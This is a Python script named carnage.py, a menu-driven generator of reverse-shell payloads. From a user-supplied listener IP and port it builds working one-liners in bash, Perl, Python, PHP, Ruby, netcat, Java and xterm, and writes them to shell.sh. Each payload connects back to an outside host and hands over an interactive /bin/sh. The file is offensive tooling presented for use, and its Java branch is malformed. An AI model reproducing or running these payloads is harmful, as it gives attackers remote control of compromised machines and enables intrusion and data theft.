#title           :carnage.py
#description     :Simple tool which can creat any type of reverse shell script code
#author          :Ishara Abeythissa
#date            :20191111
#version         :Python 3    
#usage           :python3 carnage.py
#!/usr/bin/python3
from time import sleep
import sys
import curses, os

def banner():
	line_1 = "Welcome to the carnage tool! Please refer the menu\n"
	for x in line_1:
    			print(x, end='')
    			sys.stdout.flush()
    			sleep(0.1)


def menu():
	            
                global ip,port     
                banner()           
                print("[*] Reverse shell script menu")
                print("    [1] BASH script")
                print("    [2] PERL script")
                print("    [3] PYTHON script")
                print("    [4] PHP script")
                print("    [5] RUBY script")
                print("    [6] NETCAT script")
                print("    [7] JAVA script")
                print("    [8] XTERM script")
                choice = input("[*] Please select your choice => ")                
                ip = input("[*] Set LHOST: ")
                port = input("[*] Set LPORT: ")
                if choice == "1":
                    bash()
                elif choice == "2":
                    perl()
                elif choice == "3":
                    python()
                elif choice == "4":
                    php()
                elif choice == "5":
                    ruby()
                elif choice == "6":
                    netcat()
                elif choice == "7":
                    java()
                elif choice == "8":
                    xterm()
                else:
                    print("else choice",type(choice))

def bash():           
                script = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
                shGen(script)
                print(script)
def perl():     
                ipAddress='"'+ip+'"'                
                script = "perl -e 'use Socket;$i="+ipAddress+";$p="+port+""+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''
                shGen(script)
                print(script)

def python():           
                ipAddress='"'+ip+'"'
                script = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("+ipAddress+","+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);" + 'os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
                shGen(script)
                print(script)


def php():
                ipAddress='"'+ip+'"'
                script = "php -r '$sock=fsockopen("+ipAddress+","+port+");"+'exec("/bin/sh -i <&3 >&3 2>&3");\''
                shGen(script)
                print(script)

def ruby():                                                
                ipAddress='"'+ip+'"'
                script="ruby -rsocket -e 'exit if fork;c=TCPSocket.new("+ipAddress+","+port+");"+'while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
                shGen(script)
                print(script)

def netcat():                
                script ="rm /tmp/f;mknod /tmp/f p; nc " +ip+ " "+port+" 0</tmp/f | /bin/sh 1>/tmp/f"                
                shGen(script)
                print(script)

def java():
                
                script1 = "r = Runtime.getRuntime()"
                script2 = "p = r.exec(["+"/bin/bash","-c","exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do \$line 2>&5 >&5;"
                script3 = '"done"] as String[])"'
                script4 = 'p.waitFor()'
                print(script1)
                print(script2)
                print(script3)
                print(script4)
                script=str(script1)+'\n'+str(script2)+'\n'+str(script3)+'\n'+str(script4)+'\n'                
                shGen(script)
def xterm():

                script = "xterm -display "+ip+":"+port+""
                shGen(script)
                print(script)

def shGen(content):
	      f=open('shell.sh','w+')
	      f.write(content)
	      f.close()
          
def main():        
              menu()

main()
                                                               


                                                                                                                        
